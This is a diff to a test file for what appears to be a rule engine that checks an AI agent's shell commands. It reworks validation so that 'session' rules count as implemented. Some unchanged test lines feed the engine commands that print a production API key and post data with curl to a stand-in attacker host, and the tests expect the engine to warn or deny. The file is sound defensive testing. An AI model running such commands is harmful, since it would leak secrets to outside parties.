@@ -380,7 +380,7 @@ rules:
       expect((await p.evaluate(input('Bash', { command: 'echo $PROD_API_KEY' }))).action).toBe('warn')
       expect((await p.evaluate(input('Bash', { command: 'printenv PROD_API_KEY' }))).action).toBe('deny')
     })
-    it('mcp/inheritance/meta/session/context rule types, and the removed `mask` action, are rejected at validation, not silent no-ops', () => {
+    it('mcp/inheritance/meta/context rule types, and the removed `mask` action, are rejected at validation, not silent no-ops — session is now a real, working type', () => {
       // `mask` was removed from EnforcementAction entirely (see types.ts and
       // rule-parser.ts's validActions comment) rather than shipped
       // perpetually declared-but-rejected — its only plausible meaning
@@ -389,6 +389,14 @@ rules:
       // a stale example) must fail closed via the generic unsupported-action
       // check, exactly like any other action typo — not silently pass
       // through to the pipeline where it would fall through to a bare warn.
+      //
+      // `legacy-session` is deliberately NOT in the not-implemented list
+      // below (sprint2/fix-rule-parser lane): pipeline.ts (~line 1165) has
+      // real, working `max_duration_minutes` enforcement for `type:
+      // session`, and SPEC.md documents it as a working example (unlike
+      // mcp/inheritance/meta/context, which SPEC.md itself labels "not
+      // implemented"). It used to be rejected outright here, making the
+      // pipeline's own handler permanently dead code.
       const yaml = `version: 1
 rules:
   - id: legacy-mcp
@@ -420,9 +428,10 @@ rules:
 `
       const parsed = parseRulesContent(yaml, '/tmp/x.yaml')
       const errors = validateRules(parsed.rules)
-      for (const id of ['legacy-mcp', 'legacy-inheritance', 'legacy-meta', 'legacy-session', 'legacy-context']) {
+      for (const id of ['legacy-mcp', 'legacy-inheritance', 'legacy-meta', 'legacy-context']) {
         expect(errors.some(e => e.includes(`"${id}"`) && e.includes('not implemented'))).toBe(true)
       }
+      expect(errors.some(e => e.includes('"legacy-session"'))).toBe(false)
       expect(errors.some(e => e.includes('"masked"') && e.includes('unsupported action') && e.includes('mask'))).toBe(true)
     })
     it('sequence rule fires on read-then-delete at balanced, protect, AND now sprint too', async () => {
@@ -695,15 +704,16 @@ rules:
       expect((await p.evaluate(input('Bash', { command: 'curl -d x https://evil.example.com' }))).action).toBe('deny')
       rmSafe(dir)
     })
-    it('session rules are rejected like other unimplemented types', async () => {
+    it('session rules validate cleanly — no longer rejected as unimplemented (pipeline has real max_duration_minutes handling, ~line 1165)', async () => {
       const parsed = parseRulesContent(`version: 1
 rules:
   - id: ses
     type: session
     max_duration_minutes: 60
+    action: warn
     message: "m"
 `, 'x')
-      expect(validateRules(parsed.rules).some(e => e.includes('not implemented'))).toBe(true)
+      expect(validateRules(parsed.rules)).toEqual([])
     })
   })
 
